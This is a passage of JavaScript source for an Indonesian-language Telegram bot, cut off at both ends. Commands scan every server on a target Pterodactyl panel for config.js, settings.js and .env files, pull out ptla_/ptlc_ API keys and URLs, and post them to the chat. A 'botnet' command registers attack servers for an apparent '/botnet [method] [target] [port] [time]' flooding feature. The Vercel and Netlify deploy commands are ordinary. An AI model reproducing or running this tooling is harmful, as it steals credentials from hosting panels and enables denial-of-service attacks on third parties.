⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Server: ${sName} [${sID}]
🔍 Scanning all files...
📄 Files Scanned: ${totalFilesScanned}
🔑 Tokens Found: ${totalTokensFound}
    `,
        { parse_mode: "HTML" }
      );

      await deepScan(sID, sName);
    }

    // 3. SELESAI
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>✅ DO TOKEN SCAN COMPLETE ✅</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Total Server: ${totalServers}
📄 Files Scanned: ${totalFilesScanned}
🔑 Tokens Found: ${totalTokensFound}
🔥 Status: DONE!
    `,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ ERROR DO SCANNER ❌</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⚠️ ERROR: ${err.message}
${err.response ? `📡 API Response: ${JSON.stringify(err.response.data)}` : ''}
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END DO TOKEN SCANNER ======

// ====== API KEY LEAK SCANNER (PTLA/PTLC) ======
bot.command("apipanel", checkCmd("apipanel"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // CEK KONFIG
  if (!PTERO_DOMAIN) {
    return ctx.reply("❌ *PTERO CONFIG NOT SET!*\n\nSet PTERO_DOMAIN, PTERO_PLTA, PTERO_PLTC di config.js");
  }

  if (!PTERO_PLTA) {
    return ctx.reply("❌ *PLTA TOKEN NOT SET!*\n\nSet PTERO_PLTA di config.js");
  }

  if (!PTERO_PLTC) {
    return ctx.reply("❌ *PLTC TOKEN NOT SET!*\n\nSet PTERO_PLTC di config.js");
  }

  const host = PTERO_DOMAIN.replace(/\/$/, '');
  const chatId = ctx.chat.id.toString();

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>🔥 API KEY LEAK SCANNER 🔥</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ⏳ Memulai scan API keys...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🔍 Mencari PTLA/PTLC token di semua server...
    `,
    parse_mode: "HTML"
  });

  let totalServers = 0;
  let totalFilesScanned = 0;
  let totalLeaksFound = 0;

  // FUNGSI SCAN FILE CONTENT
  async function scanFileContent(sID, sName, fPath) {
    try {
      const contentRes = await axios.get(`${host}/api/client/servers/${sID}/files/contents?file=%2F${encodeURIComponent(fPath)}`, {
        headers: { 
          'Authorization': `Bearer ${PTERO_PLTC}`, 
          'Accept': 'application/json' 
        },
        timeout: 10000
      });

      const content = contentRes.data;

      // REGEX: Mencari pola ptla_ dan ptlc_
      const ptlaRegex = /ptla_[a-zA-Z0-9]+/g;
      const ptlcRegex = /ptlc_[a-zA-Z0-9]+/g;
      const urlRegex = /https?:\/\/[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}[^\s'"]*/g;

      const foundPtla = content.match(ptlaRegex) || [];
      const foundPtlc = content.match(ptlcRegex) || [];
      const foundUrl = content.match(urlRegex) || [];

      if (foundPtla.length > 0 || foundPtlc.length > 0 || foundUrl.length > 0) {
        totalLeaksFound++;

        let message = `🔥 **RANGZ SYSTEM DETECTED PTLA PTLC & DOMAIN** 🔥\n`;
        message += `━━━━━━━━━━━━━━━━━━━━\n`;
        message += `🖥️ **SERVER** : \`${sName}\`\n`;
        message += `📂 **FILE** : \`${fPath}\`\n`;
        message += `━━━━━━━━━━━━━━━━━━━━\n\n`;

        if (foundPtla.length > 0) {
          message += `🔑 **PTLA KEYS:**\n\`${[...new Set(foundPtla)].join('\n')}\`\n\n`;
        }

        if (foundPtlc.length > 0) {
          message += `🔑 **PTLC KEYS:**\n\`${[...new Set(foundPtlc)].join('\n')}\`\n\n`;
        }

        if (foundUrl.length > 0) {
          message += `🌐 **FOUND URLS:**\n\`${[...new Set(foundUrl)].join('\n')}\`\n`;
        }

        // KIRIM KE CHAT
        await ctx.reply(message, { parse_mode: 'Markdown' });

        // NOTIF KE BOT
        await ctx.telegram.sendMessage(chatId,
          `✅ **API LEAK FOUND!**\n🖥️ ${sName}\n📂 ${fPath}\n🔑 PTLA: ${foundPtla.length} | PTLC: ${foundPtlc.length}`,
          { parse_mode: 'Markdown' }
        );

        console.log(`[API SCAN] Found leak in ${sName}: ${fPath}`);
      }

    } catch (e) {
      // Skip file jika error
    }
  }

  // FUNGSI DEEP SCAN
  async function deepScan(sID, sName, dir = '') {
    try {
      const encodedDir = encodeURIComponent(dir || '/');
      const filesRes = await axios.get(`${host}/api/client/servers/${sID}/files/list?directory=${encodedDir}`, {
        headers: { 
          'Authorization': `Bearer ${PTERO_PLTC}`, 
          'Accept': 'application/json' 
        },
        timeout: 8000
      });

      const files = filesRes.data.data || [];

      for (const file of files) {
        const fName = file.attributes.name;
        const isDir = file.attributes.mimetype === 'application/x-directory' || !fName.includes('.');
        const fPath = dir ? `${dir}/${fName}` : fName;

        if (isDir) {
          if (!['node_modules', '.npm', '.git'].includes(fName)) {
            await deepScan(sID, sName, fPath);
          }
        } else if (fName === 'config.js' || fName === 'settings.js' || fName === '.env') {
          totalFilesScanned++;
          await scanFileContent(sID, sName, fPath);

          // UPDATE PROGRESS
          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            msg.message_id,
            null,
            `
<blockquote>🔥 API KEY LEAK SCANNER 🔥</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: 🔍 Scanning...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Server: ${sName}
📂 File: ${fPath}
📄 Files Scanned: ${totalFilesScanned}
🔑 Leaks Found: ${totalLeaksFound}
    `,
            { parse_mode: "HTML" }
          );
        }
      }
    } catch (e) {
      // Silent skip
    }
  }

  try {
    // 1. FETCH SERVERS
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🔥 API KEY LEAK SCANNER 🔥</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: 📡 Fetching Servers...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⏳ Menghubungi API Panel...
    `,
      { parse_mode: "HTML" }
    );

    const serversRes = await axios.get(`${host}/api/application/servers`, {
      headers: {
        'Authorization': `Bearer ${PTERO_PLTA}`,
        'Accept': 'application/json'
      },
      timeout: 10000
    });

    const servers = serversRes.data.data || [];
    totalServers = servers.length;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🔥 API KEY LEAK SCANNER 🔥</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ✅ Found ${totalServers} Servers
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🔄 Scanning ${totalServers} server...
🔍 Mencari PTLA/PTLC di config files
    `,
      { parse_mode: "HTML" }
    );

    // 2. LOOP SEMUA SERVER
    for (let i = 0; i < servers.length; i++) {
      const server = servers[i];
      const sID = server.attributes.identifier;
      const sName = server.attributes.name;

      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msg.message_id,
        null,
        `
<blockquote>🔥 API KEY LEAK SCANNER 🔥</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${i + 1}/${totalServers}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Server: ${sName} [${sID}]
🔍 Scanning config files...
📄 Files Scanned: ${totalFilesScanned}
🔑 Leaks Found: ${totalLeaksFound}
    `,
        { parse_mode: "HTML" }
      );

      await deepScan(sID, sName);
    }

    // 3. SELESAI
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>✅ API LEAK SCAN COMPLETE ✅</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Total Server: ${totalServers}
📄 Files Scanned: ${totalFilesScanned}
🔑 Leaks Found: ${totalLeaksFound}
🔥 Status: DONE!
    `,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ ERROR API SCANNER ❌</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⚠️ ERROR: ${err.message}
${err.response ? `📡 API Response: ${JSON.stringify(err.response.data)}` : ''}
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END API KEY LEAK SCANNER ======

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "ZYNOSBUG");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "𝗛𝗮𝗽𝘂𝘀", callback_data: "Close", style: "danger" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
// Handler untuk tombol close
bot.action("Close", async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!OWNER_IDS.includes(userId)) {
    return ctx.answerCbQuery("Lu Siapa Kontol", { show_alert: true });
  }

  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
    await ctx.answerCbQuery("❌ Gagal menghapus pesan!", { show_alert: true });
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});

// ====== DEPLOY TO VERCEL ======
bot.command("deployvercel", checkCmd("deployvercel"), checkOwner, async (ctx) => {
  // CEK KONFIG
  if (!GITHUB_TOKEN || GITHUB_TOKEN === "your_github_token_here") {
    return ctx.reply("❌ *GITHUB_TOKEN NOT SET!*\n\nSet GITHUB_TOKEN di config.js", { parse_mode: 'Markdown' });
  }

  if (!GITHUB_USERNAME || GITHUB_USERNAME === "your_github_username") {
    return ctx.reply("❌ *GITHUB_USERNAME NOT SET!*\n\nSet GITHUB_USERNAME di config.js", { parse_mode: 'Markdown' });
  }

  if (!VERCEL_API_TOKEN || VERCEL_API_TOKEN === "your_vercel_api_token_here") {
    return ctx.reply("❌ *VERCEL_API_TOKEN NOT SET!*\n\nSet VERCEL_API_TOKEN di config.js", { parse_mode: 'Markdown' });
  }

  // CEK REPLY FILE
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.reply(
      `❌ *Format Salah!*\n\n` +
      `Reply pesan yang berisi file HTML dengan perintah ini.\n` +
      `Example: \`/deployvercel mywebsite\`\n\n` +
      `📝 *Keterangan:*\n` +
      `• File harus berupa HTML\n` +
      `• Nama domain tanpa spasi`,
      { parse_mode: 'Markdown' }
    );
  }

  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      `❌ *Harap sertakan nama domain!*\n\n` +
      `Example: \`/deployvercel mywebsite\``,
      { parse_mode: 'Markdown' }
    );
  }

  const domainName = args[1].replace(/[^a-zA-Z0-9-]/g, ''); // Sanitize
  const fileId = ctx.message.reply_to_message.document.file_id;

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>🚀 DEPLOY TO VERCEL 🚀</blockquote>
👤 User: ${ctx.from.username ? `@${ctx.from.username}` : ctx.from.id}
📊 Status: ⏳ Memulai deploy...
⏰ Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
━━━━━━━━━━━━━━━━━━━━
🌐 Domain: ${domainName}.vercel.app
📄 File: ${ctx.message.reply_to_message.document.file_name || 'index.html'}
🔄 Proses deploy...
    `,
    parse_mode: "HTML"
  });

  try {
    // 1. DOWNLOAD FILE
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🚀 DEPLOY TO VERCEL 🚀</blockquote>
👤 User: ${ctx.from.username ? `@${ctx.from.username}` : ctx.from.id}
📊 Status: ⏳ Downloading file...
⏰ Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
━━━━━━━━━━━━━━━━━━━━
🌐 Domain: ${domainName}.vercel.app
📄 File: ${ctx.message.reply_to_message.document.file_name || 'index.html'}
⬇️ Mendownload file dari Telegram...
    `,
      { parse_mode: "HTML" }
    );

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'stream' });

    // 2. BUAT REPOSITORY DI GITHUB
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🚀 DEPLOY TO VERCEL 🚀</blockquote>
👤 User: ${ctx.from.username ? `@${ctx.from.username}` : ctx.from.id}
📊 Status: ⏳ Creating GitHub repo...
⏰ Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
━━━━━━━━━━━━━━━━━━━━
🌐 Domain: ${domainName}.vercel.app
📄 File: ${ctx.message.reply_to_message.document.file_name || 'index.html'}
📦 Membuat repository di GitHub...
    `,
      { parse_mode: "HTML" }
    );

    const repoName = `vercel-${domainName}-${Date.now()}`;
    const githubResponse = await axios.post(
      'https://api.github.com/user/repos',
      {
        name: repoName,
        auto_init: false,
        private: false
      },
      {
        headers: {
          Authorization: `token ${GITHUB_TOKEN}`,
          Accept: 'application/vnd.github.v3+json'
        },
        timeout: 15000
      }
    );

    // 3. UPLOAD FILE KE GITHUB
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🚀 DEPLOY TO VERCEL 🚀</blockquote>
👤 User: ${ctx.from.username ? `@${ctx.from.username}` : ctx.from.id}
📊 Status: ⏳ Uploading to GitHub...
⏰ Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
━━━━━━━━━━━━━━━━━━━━
🌐 Domain: ${domainName}.vercel.app
📄 File: ${ctx.message.reply_to_message.document.file_name || 'index.html'}
⬆️ Uploading file ke GitHub...
    `,
      { parse_mode: "HTML" }
    );

    const content = await streamToBuffer(response.data);
    const contentBase64 = content.toString('base64');

    await axios.put(
      `https://api.github.com/repos/${GITHUB_USERNAME}/${repoName}/contents/index.html`,
      {
        message: 'Add index.html',
        content: contentBase64
      },
      {
        headers: {
          Authorization: `token ${GITHUB_TOKEN}`,
          Accept: 'application/vnd.github.v3+json'
        },
        timeout: 15000
      }
    );

    // 4. DEPLOY KE VERCEL
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🚀 DEPLOY TO VERCEL 🚀</blockquote>
👤 User: ${ctx.from.username ? `@${ctx.from.username}` : ctx.from.id}
📊 Status: ⏳ Deploying to Vercel...
⏰ Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
━━━━━━━━━━━━━━━━━━━━
🌐 Domain: ${domainName}.vercel.app
📄 File: ${ctx.message.reply_to_message.document.file_name || 'index.html'}
🚀 Deploying ke Vercel...
    `,
      { parse_mode: "HTML" }
    );

    const vercelResponse = await axios.post(
      'https://api.vercel.com/v13/deployments',
      {
        name: repoName,
        gitSource: {
          type: 'github',
          repoId: githubResponse.data.id,
          ref: 'main'
        },
        target: 'production'
      },
      {
        headers: {
          Authorization: `Bearer ${VERCEL_API_TOKEN}`,
          'Content-Type': 'application/json'
        },
        timeout: 30000
      }
    );

    // 5. SUCCESS
    const successMsg = `
<blockquote>✅ DEPLOY SUCCESS! ✅</blockquote>
👤 User: ${ctx.from.username ? `@${ctx.from.username}` : ctx.from.id}
⏰ Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
━━━━━━━━━━━━━━━━━━━━
🌐 **Domain:** https://${domainName}.vercel.app
📄 **File:** ${ctx.message.reply_to_message.document.file_name || 'index.html'}
📊 **Status:** ${vercelResponse.data.status || 'DEPLOYED'}
📦 **Repo:** ${repoName}
    `;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      successMsg,
      { parse_mode: "HTML" }
    );

    // KIRIM LINK
    await ctx.reply(
      `✅ *Website berhasil di-deploy!*\n\n` +
      `🌐 https://${domainName}.vercel.app\n` +
      `📊 Status: Production\n` +
      `🔗 Repo: https://github.com/${GITHUB_USERNAME}/${repoName}`,
      { parse_mode: 'Markdown' }
    );

  } catch (error) {
    console.error('[DEPLOYVERCEL] Error:', error.response?.data || error.message);

    let errorMsg = error.message;
    if (error.response?.data?.message) {
      errorMsg = error.response.data.message;
    } else if (error.response?.data?.error?.message) {
      errorMsg = error.response.data.error.message;
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ DEPLOY FAILED ❌</blockquote>
👤 User: ${ctx.from.username ? `@${ctx.from.username}` : ctx.from.id}
⏰ Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
━━━━━━━━━━━━━━━━━━━━
🌐 Domain: ${domainName}.vercel.app
⚠️ ERROR: ${errorMsg}
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END DEPLOY VERCEL ======

// ====== DEPLOY TO NETLIFY ======
bot.command("deploynetlify", checkCmd("deploynetlify"), checkOwner, async (ctx) => {
  // CEK KONFIG
  if (!NETLIFY_API_TOKEN || NETLIFY_API_TOKEN === "your_netlify_api_token_here") {
    return ctx.reply("❌ *NETLIFY_API_TOKEN NOT SET!*\n\nSet NETLIFY_API_TOKEN di config.js", { parse_mode: 'Markdown' });
  }

  // CEK REPLY FILE
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.reply(
      `❌ *Format Salah!*\n\n` +
      `Reply pesan yang berisi file HTML dengan perintah ini.\n` +
      `Example: \`/deploynetlify mywebsite\`\n\n` +
      `📝 *Keterangan:*\n` +
      `• File harus berupa HTML\n` +
      `• Nama domain tanpa spasi`,
      { parse_mode: 'Markdown' }
    );
  }

  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      `❌ *Harap sertakan nama domain!*\n\n` +
      `Example: \`/deploynetlify mywebsite\``,
      { parse_mode: 'Markdown' }
    );
  }

  const domainName = args[1].replace(/[^a-zA-Z0-9-]/g, ''); // Sanitize
  const fileId = ctx.message.reply_to_message.document.file_id;
  const fileName = ctx.message.reply_to_message.document.file_name || 'index.html';

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>🚀 DEPLOY TO NETLIFY 🚀</blockquote>
👤 User: ${ctx.from.username ? `@${ctx.from.username}` : ctx.from.id}
📊 Status: ⏳ Memulai deploy...
⏰ Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
━━━━━━━━━━━━━━━━━━━━
🌐 Domain: ${domainName}.netlify.app
📄 File: ${fileName}
🔄 Proses deploy...
    `,
    parse_mode: "HTML"
  });

  try {
    // 1. DOWNLOAD FILE
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🚀 DEPLOY TO NETLIFY 🚀</blockquote>
👤 User: ${ctx.from.username ? `@${ctx.from.username}` : ctx.from.id}
📊 Status: ⏳ Downloading file...
⏰ Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
━━━━━━━━━━━━━━━━━━━━
🌐 Domain: ${domainName}.netlify.app
📄 File: ${fileName}
⬇️ Mendownload file dari Telegram...
    `,
      { parse_mode: "HTML" }
    );

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'stream' });

    // 2. DEPLOY KE NETLIFY
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🚀 DEPLOY TO NETLIFY 🚀</blockquote>
👤 User: ${ctx.from.username ? `@${ctx.from.username}` : ctx.from.id}
📊 Status: ⏳ Deploying to Netlify...
⏰ Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
━━━━━━━━━━━━━━━━━━━━
🌐 Domain: ${domainName}.netlify.app
📄 File: ${fileName}
🚀 Mengupload ke Netlify...
    `,
      { parse_mode: "HTML" }
    );

    const formData = new FormData();
    formData.append('file', response.data, { filename: 'index.html' });

    const netlifyResponse = await axios.post(
      'https://api.netlify.com/api/v1/sites',
      formData,
      {
        headers: {
          Authorization: `Bearer ${NETLIFY_API_TOKEN}`,
          ...formData.getHeaders()
        },
        timeout: 30000
      }
    );

    // 3. UPDATE SITE NAME (optional)
    if (netlifyResponse.data && netlifyResponse.data.id) {
      try {
        await axios.patch(
          `https://api.netlify.com/api/v1/sites/${netlifyResponse.data.id}`,
          {
            name: domainName
          },
          {
            headers: {
              Authorization: `Bearer ${NETLIFY_API_TOKEN}`
            },
            timeout: 10000
          }
        );
      } catch (patchErr) {
        console.log('[NETLIFY] Gagal update site name:', patchErr.message);
      }
    }

    // 4. SUCCESS
    const siteUrl = netlifyResponse.data?.subdomain 
      ? `https://${netlifyResponse.data.subdomain}.netlify.app`
      : `https://${domainName}.netlify.app`;

    const successMsg = `
<blockquote>✅ DEPLOY SUCCESS! ✅</blockquote>
👤 User: ${ctx.from.username ? `@${ctx.from.username}` : ctx.from.id}
⏰ Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
━━━━━━━━━━━━━━━━━━━━
🌐 **Domain:** ${siteUrl}
📄 **File:** ${fileName}
📊 **Status:** ${netlifyResponse.data?.state || 'DEPLOYED'}
🆔 **Site ID:** ${netlifyResponse.data?.id || 'N/A'}
    `;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      successMsg,
      { parse_mode: "HTML" }
    );

    // KIRIM LINK
    await ctx.reply(
      `✅ *Website berhasil di-deploy ke Netlify!*\n\n` +
      `🌐 ${siteUrl}\n` +
      `📊 Status: ${netlifyResponse.data?.state || 'Production'}\n` +
      `🆔 Site ID: ${netlifyResponse.data?.id || 'N/A'}`,
      { parse_mode: 'Markdown' }
    );

  } catch (error) {
    console.error('[DEPLOYNETLIFY] Error:', error.response?.data || error.message);

    let errorMsg = error.message;
    if (error.response?.data?.message) {
      errorMsg = error.response.data.message;
    } else if (error.response?.data?.error) {
      errorMsg = typeof error.response.data.error === 'string' 
        ? error.response.data.error 
        : JSON.stringify(error.response.data.error);
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ DEPLOY FAILED ❌</blockquote>
👤 User: ${ctx.from.username ? `@${ctx.from.username}` : ctx.from.id}
⏰ Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
━━━━━━━━━━━━━━━━━━━━
🌐 Domain: ${domainName}.netlify.app
⚠️ ERROR: ${errorMsg}
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END DEPLOY NETLIFY ======

// ====== ADD BOTNET SERVER ======
bot.command("addsrv", checkCmd("addsrv"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // PARSE ARGUMEN
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ FORMAT SALAH GOBLOK!</blockquote>
──────────────────────
📌 <b>Gunakan:</b> /addsrv [url_server]
📋 <b>Contoh:</b>
• /addsrv http://178.128.120.92:2883
• /addsrv https://server-botnet.com:8080
──────────────────────
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  let serverUrl = args[1].trim();
  
  // VALIDASI URL
  if (!serverUrl.startsWith('http://') && !serverUrl.startsWith('https://')) {
    serverUrl = 'http://' + serverUrl;
  }
  serverUrl = serverUrl.replace(/\/$/, '');

  let hostname, port;
  try {
    const urlObj = new URL(serverUrl);
    hostname = urlObj.hostname;
    port = urlObj.port || (urlObj.protocol === 'https:' ? '443' : '80');
  } catch (error) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>❌ URL TIDAK VALID!</blockquote>
──────────────────────
🔗 URL: ${serverUrl}
💡 Format: http://ip:port
📌 Contoh: http://178.128.120.92:2883
──────────────────────
乙 ㄚ 几 ㄖ 丂
      `,
      parse_mode: "HTML"
    });
  }

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>⏳ TESTING KONEKSI SERVER...</blockquote>
──────────────────────
🔗 URL: ${serverUrl}
🌐 HOST: ${hostname}
🔌 PORT: ${port}
⏱️ TIMEOUT: 5 DETIK
──────────────────────
⏳ Mencoba koneksi ke /repzapi...
乙 ㄚ 几 ㄖ 丂
    `,
    parse_mode: "HTML"
  });

  try {
    // CEK KONEKSI KE /repzapi
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);
    
    const response = await axios.get(`${serverUrl}/repzapi`, {
      signal: controller.signal,
      timeout: 5000,
      headers: {
        'User-Agent': 'X-ZeroAI/6.9',
        'Accept': 'application/json'
      }
    });
    
    clearTimeout(timeoutId);

    if (response.status === 200 || response.status === 404) {
      // PATH FILE BOTNET
      const botnetPath = path.join(__dirname, './database/botnet.json');
      let botnetServers = [];
      
      if (fs.existsSync(botnetPath)) {
        try {
          const fileContent = fs.readFileSync(botnetPath, 'utf8');
          botnetServers = JSON.parse(fileContent);
        } catch (e) {
          botnetServers = [];
        }
      }
      
      // CEK APAKAH SERVER SUDAH ADA
      const existingServer = botnetServers.find(s => s.url === serverUrl);
      if (existingServer) {
        return ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          `
<blockquote>⚠️ SERVER SUDAH ADA!</blockquote>
──────────────────────
🔗 URL: ${serverUrl}
🆔 ID: ${existingServer.id}
📊 STATUS: ${existingServer.status}
📅 DITAMBAH: ${new Date(existingServer.addedAt).toLocaleString('id-ID')}
──────────────────────
📌 Gunakan: /listsrv
乙 ㄚ 几 ㄖ 丂
          `,
          { parse_mode: "HTML" }
        );
      }
      
      // GENERATE ID BARU
      let newId = 1;
      if (botnetServers.length > 0) {
        newId = Math.max(...botnetServers.map(s => s.id)) + 1;
      }
      
      // SIMPAN SERVER
      const newServer = {
        id: newId,
        url: serverUrl,
        hostname: hostname,
        port: port,
        status: "online",
        addedAt: new Date().toISOString(),
        lastChecked: new Date().toISOString()
      };
      
      botnetServers.push(newServer);
      
      // PASTIKAN FOLDER DATABASE ADA
      if (!fs.existsSync('./database')) {
        fs.mkdirSync('./database', { recursive: true });
      }
      
      fs.writeFileSync(botnetPath, JSON.stringify(botnetServers, null, 2), 'utf8');
      
      // SUCCESS
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msg.message_id,
        null,
        `
<blockquote>✅ SERVER BOTNET BERHASIL DITAMBAHKAN!</blockquote>
──────────────────────
🔗 <b>URL:</b> ${serverUrl}
🌐 <b>HOST:</b> ${hostname}
🔌 <b>PORT:</b> ${port}
🆔 <b>ID:</b> ${newServer.id}
📊 <b>STATUS:</b> 🟢 ONLINE
──────────────────────
📋 <b>TOTAL SERVER:</b> ${botnetServers.length}
💾 <b>DATABASE:</b> TERSIMPAN
──────────────────────
🔥 Gunakan: /botnet [method] [target] [port] [time]
乙 ㄚ 几 ㄖ 丂 READY
        `,
        { parse_mode: "HTML" }
      );
      
      // KIRIM NOTIF KE CHAT
      await ctx.reply(
        `✅ *SERVER BOTNET ADDED!*\n\n` +
        `🔗 ${serverUrl}\n` +
        `🆔 ID: ${newId}\n` +
        `📊 Status: ONLINE\n` +
        `📦 Total: ${botnetServers.length}`,
        { parse_mode: 'Markdown' }
      );
      
    } else {
      throw new Error(`HTTP ${response.status}`);
    }
    
  } catch (error) {
    const errorMsg = error.code === 'ECONNABORTED' ? 'TIMEOUT (5 detik)' : (error.message || 'SERVER MATI');
    
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
